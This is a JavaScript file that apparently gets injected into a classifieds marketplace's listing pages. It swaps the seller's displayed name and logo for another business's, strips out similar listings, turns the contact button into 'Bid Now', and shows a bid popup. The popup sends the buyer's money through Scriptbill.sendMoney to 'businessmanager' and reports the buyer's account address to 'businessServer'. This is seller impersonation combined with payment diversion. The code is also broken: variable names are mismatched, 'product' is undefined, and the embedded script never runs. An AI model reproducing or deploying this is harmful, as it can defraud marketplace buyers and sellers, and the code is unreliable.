
const bodyInterval = setInterval(()=>{
	const root = document.getElementById("__nuxt");
	if(root ){
		root.style.display = "block";		
	} else if( root.style.display == "block"){
		clearInterval(bodyInterval);
	}
}, 1000);



const contact = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div > div > div.b-seller-page > div > div > div.b-seller-mobile-info-block > div.b-seller-mobile-info-block__buttons.h-mb-15 > div > div.b-seller-bottom-buttons__item.b-seller-bottom-buttons__item--contact > a > span");


const nameInterval = setInterval(()=>{
	const name = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div > div > div.b-seller-page > div > div > div.b-seller-mobile-info-block > div.b-seller-mobile-info-block__header.h-dflex.h-mb-15 > div.b-seller-mobile-info-block__header-text > div.b-seller-mobile-info-block__header-name.h-mb-5 > span");
	
	if( name ){
		clearInterval(nameInterval);
		name.innerText = businessName;
	}
}, 1000);



const logoInterval = setInterval(()=>{
	const logo = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div > div > div.b-seller-page > div > div > div.b-seller-mobile-info-block > div.b-seller-mobile-info-block__header.h-dflex.h-mb-15 > div.b-seller-mobile-info-block__header-photo > div.b-static-image > img");
	
	if( logo ){
		clearInterval(logoInterval);
		logo.src = businessLogo;
	}
}, 1000);





const bodyHtml = document.body.innerHTML;

const bidInterval = setInterval(()=>{
	const bidButton = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-advert-item-wrapper > div.h-mh--10.b-advert-card-wrapper > div.qa-advert-item.b-advert-card > div.b-advert-card__head > div.h-mt-5 > div > div.b-advert-contact-buttons__item.h-flex-1-0.h-mb-8 > a > span");
	
	
	if( ! bidButton ) return;
	
	const bidButton2 = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-advert-item-wrapper > div.h-mh--10.b-advert-card-wrapper > div.qa-advert-item.b-advert-card > div.b-advert-card-wrapper__bottom.h-dflex.h-flex-cross-center.h-pv-10.h-ph-15 > div.h-flex-1-0.h-ml-10 > a > span > div > div");
	
	clearInterval(bidInterval);
	const bidName = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-advert-item-wrapper > div.h-mh--10.b-advert-card-wrapper > div.qa-advert-item.b-advert-card > div.b-advert-card__head > div.b-advert-title-outer > div.b-advert-title-outer__inner > h1 > div")
	const bidPrice = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-advert-item-wrapper > div.h-mh--10.b-advert-card-wrapper > div.qa-advert-item.b-advert-card > div.b-advert-card__head > div.b-advert-title-outer > div.b-advert-card__head-price.h-dflex.h-flex-cross-center > div.qa-advert-price-view.h-flex-1-0.qa-advert-mobile-price.b-advert-mobile-price > div > span.qa-advert-price-view-value");
	const bidDesc = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-advert-item-wrapper > div.h-mh--10.b-advert-card-wrapper > div.qa-advert-item.b-advert-card > div.b-advert__description-wrapper > div > div.b-advert-item-details-collapser__rest.b-advert-item-details-collapser__rest--has-min-height > div > div > span");
	const similarTitle = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.h-dflex.h-pb-20.h-flex-dir-column > div > div.h-flex-center-between");
	const similarProducts = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.h-dflex.h-pb-20.h-flex-dir-column > div > div.b-similar-listing-outer");
	const postAds = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-seller-info-wrapper > div:nth-child(2) > div:nth-child(3)");
	similarTitle.remove();
	similarProducts.remove();
	postAds.remove();
	const shopLogo = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-seller-info-wrapper > div:nth-child(1) > div.h-dflex.h-flex-dir-column.h-mm992-flex-dir-row > div > div.b-seller-advert-info__inner > div.h-pos-rel > a");
	const shopName = document.querySelector("#__nuxt > div > div.b-body-wrapper.js-body-wrapper > div > div > div.b-content-wrapper > div > div > div.b-advert-seller-info-wrapper > div.b-seller-info-wrapper > div:nth-child(1) > div.h-dflex.h-flex-dir-column.h-mm992-flex-dir-row > div > div.b-seller-advert-info__inner > div.b-seller-advert-info__info > a > div > div.b-seller-advert-info__name");
	shopLogo.style.backgroundImage = `url(${businessLogo})`;
	shopName.innerText = businessName;
	let productprice = bidPrice.getAttribute("content");
	let productname = bidname.innerText;
	let productDesc = bidDesc.innerText;

	const bidText = bidButton.querySelector(".b-button__text");
	bidText.innerText = "Bid Now";
	
	bidButton.addEventListener("click", function(){
		showBidPopup( productName, productDesc, productPrice, 1, Math.floor( Math.random() * 10000 ));
	});
	
	bidButton2.addEventListener("click", function(){
		showBidPopup( productName, productDesc, productPrice, 1, Math.floor( Math.random() * 10000 ));
	});
}, 1000);


function showLoginPopup(){
	
}

function showBidPopup(name ="Premium Wireless Headphones", description="Noise cancelling, 30hr battery life", price="249.99", stock="5", current="12", time = "02:15:30"){
	const popup = document.getElementById("bid-popup");
	
	if(!popup){
		const bidPopup = `<div class="bid-popup">
        <div class="popup-header">
            <h2>Place Your Bid</h2>
            <p>Win this amazing product with your best offer</p>
        </div>
        
        <div class="popup-body">
            <div class="product-info">
                <div class="product-image">
                    Product Image
                </div>
                <div class="product-details">
                    <h3>${name}</h3>
                    <p>${description}</p>
                </div>
            </div>
            
            <div class="winning-price">
                <h3>Current Winning Price</h3>
                <div class="price">$${price}</div>
            </div>
            
            <div class="stock-info">
                <div class="stock-item">
                    <div class="stock-label">Available Stock</div>
                    <div class="stock-value">${stock}</div>
                </div>
                <div class="stock-item">
                    <div class="stock-label">Current Bidders</div>
                    <div class="stock-value">${current}</div>
                </div>
                <div class="stock-item">
                    <div class="stock-label">Time Left</div>
                    <div class="stock-value">${time}</div>
                </div>
            </div>
            
            <div class="payment-options">
                <h3>Payment Options</h3>
                
                <div class="payment-type">
                    <div class="payment-option active" data-option="one-off">One-off Payment</div>
                    <div class="payment-option" data-option="installment">Installment Plan</div>
                </div>
                
                <div class="payment-details active" id="one-off-details">
                    <p>Pay the full amount immediately upon winning the bid.</p>
                </div>
                
                <div class="payment-details" id="installment-details">
                    <div class="payment-row">
                        <label>Number of Payments:</label>
                        <input type="number" min="2" max="24" value="3" id="frequency">
                    </div>
                    <div class="payment-row">
                        <label>Payment Frequency:</label>
                        <select id="interval">
							<option value="hours">Hours</option>
                            <option value="days">Days</option>
                            <option value="weeks"> Weeks</option>
                            <option value="months">Months</option>
                            <option value="years">Years</option>
                        </select>
                    </div>
                    <p class="note">Example: 3 payments every month = $83.33 per month</p>
                </div>
            </div>
            
            <div class="bid-timer">
                <h3>Bidding Ends In</h3>
                <div class="timer">${time}</div>
            </div>
            
            <div class="bid-form">
                <h3>Place Your Bid</h3>
                <div class="form-group">
                    <label for="bidAmount">Your Bid Amount ($)</label>
                    <input type="number" id="bidAmount" min="250" step="0.01" placeholder="Enter your bid amount">
                </div>
                
                <div class="bid-actions">
                    <button class="btn btn-secondary" id="cancelBid">Cancel</button>
                    <button class="btn btn-primary" id="submitBid">Submit Bid</button>
                </div>
                
                <p class="note">Your bid and payment information will be sent to the seller for approval. The highest bidder wins the product.</p>
            </div>
        </div>
    </div>

    <script>
        // Payment option selection
        const paymentOptions = document.querySelectorAll('.payment-option');
        const paymentDetails = document.querySelectorAll('.payment-details');
        
        paymentOptions.forEach(option => {
            option.addEventListener('click', () => {
                // Remove active class from all options
                paymentOptions.forEach(opt => opt.classList.remove('active'));
                paymentDetails.forEach(detail => detail.classList.remove('active'));
                
                // Add active class to clicked option
                option.classList.add('active');
                
                // Show corresponding payment details
                const optionType = option.getAttribute('data-option');
                document.getElementById(`${optionType}-details`).classList.add('active');
            });
        });
        
        // Timer countdown (for demonstration purposes)
        let timeLeft = 8130; // 2 hours, 15 minutes, 30 seconds in seconds
        
        function updateTimer() {
            const hours = Math.floor(timeLeft / 3600);
            const minutes = Math.floor((timeLeft % 3600) / 60);
            const seconds = timeLeft % 60;
            
            const formattedTime = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            document.querySelector('.timer').textContent = formattedTime;
            document.querySelector('.stock-item:last-child .stock-value').textContent = formattedTime;
            
            if (timeLeft > 0) {
                timeLeft--;
            } else {
                clearInterval(timerInterval);
                document.querySelector('.bid-timer h3').textContent = 'Bidding Has Ended';
            }
        }
        
        const timerInterval = setInterval(updateTimer, 1000);
        updateTimer(); // Initial call
		
		cancelBid.addEventListener("click",()=>{
			location.reload();
		});
		
		submitBid.addEventListener("click", function(){
			const freq = frequency.value;
			const inter = interval.value;
			const amount = bidAmount.value;
			
			if( Scriptbill.s.currentNote ){
				const note = JSON.parse(Scriptbill.s.currentNote );
				const final = amount /(freq ? freq : 1);
				Scriptbill.sendMoney(final, businessmanager ).then((sent)=>{
					console.log(sent);
					fetch(businessServer + "?account="+note.noteAddress+"&app="+businessmanager+"&amount="+final+"&frequency="+freq+"&interval="+inter+"&product=" +product );
				});
				
			}			
				
			
			else {
				showLoginPopup();
			}
		});
    </script>`;
	const styles = document.createElement("style");
	styles.innerText = `* {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .bid-popup {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 500px;
            overflow: hidden;
        }

        .popup-header {
            background: linear-gradient(135deg, #4a6fa5, #2c3e50);
            color: white;
            padding: 20px;
            text-align: center;
        }

        .popup-header h2 {
            font-size: 1.5rem;
            margin-bottom: 5px;
        }

        .popup-body {
            padding: 25px;
        }

        .product-info {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }

        .product-image {
            width: 80px;
            height: 80px;
            background-color: #f0f0f0;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: #777;
            font-size: 12px;
            text-align: center;
        }

        .product-details h3 {
            font-size: 1.2rem;
            margin-bottom: 5px;
            color: #333;
        }

        .product-details p {
            color: #666;
            font-size: 0.9rem;
        }

        .winning-price {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }

        .winning-price h3 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 1.1rem;
        }

        .price {
            font-size: 2rem;
            font-weight: bold;
            color: #27ae60;
        }

        .stock-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
            padding: 10px 0;
        }

        .stock-item {
            text-align: center;
            flex: 1;
        }

        .stock-label {
            font-size: 0.9rem;
            color: #666;
        }

        .stock-value {
            font-size: 1.2rem;
            font-weight: bold;
            color: #2c3e50;
        }

        .payment-options {
            margin-bottom: 25px;
        }

        .payment-options h3 {
            margin-bottom: 15px;
            color: #2c3e50;
            font-size: 1.1rem;
        }

        .payment-type {
            display: flex;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            overflow: hidden;
        }

        .payment-option {
            flex: 1;
            text-align: center;
            padding: 12px;
            cursor: pointer;
            transition: all 0.3s;
            background-color: #f8f9fa;
        }

        .payment-option.active {
            background-color: #4a6fa5;
            color: white;
        }

        .payment-details {
            display: none;
            margin-top: 15px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
        }

        .payment-details.active {
            display: block;
        }

        .payment-row {
            display: flex;
            margin-bottom: 10px;
            align-items: center;
        }

        .payment-row label {
            flex: 1;
            color: #555;
        }

        .payment-row input, .payment-row select {
            flex: 2;
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        .bid-timer {
            background-color: #fff9e6;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
            border-left: 4px solid #f1c40f;
        }

        .bid-timer h3 {
            color: #d35400;
            margin-bottom: 10px;
            font-size: 1.1rem;
        }

        .timer {
            font-size: 1.5rem;
            font-weight: bold;
            color: #e74c3c;
        }

        .bid-form {
            margin-top: 20px;
        }

        .bid-form h3 {
            margin-bottom: 15px;
            color: #2c3e50;
            font-size: 1.1rem;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 1rem;
        }

        .bid-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-primary {
            background-color: #4a6fa5;
            color: white;
        }

        .btn-primary:hover {
            background-color: #3a5a80;
        }

        .btn-secondary {
            background-color: #e0e0e0;
            color: #333;
        }

        .btn-secondary:hover {
            background-color: #d0d0d0;
        }

        .note {
            font-size: 0.85rem;
            color: #777;
            margin-top: 15px;
            text-align: center;
        }`;
	document.head.appendChild(styles);
	document.body.innerHTML = bidPopup;
	}
}
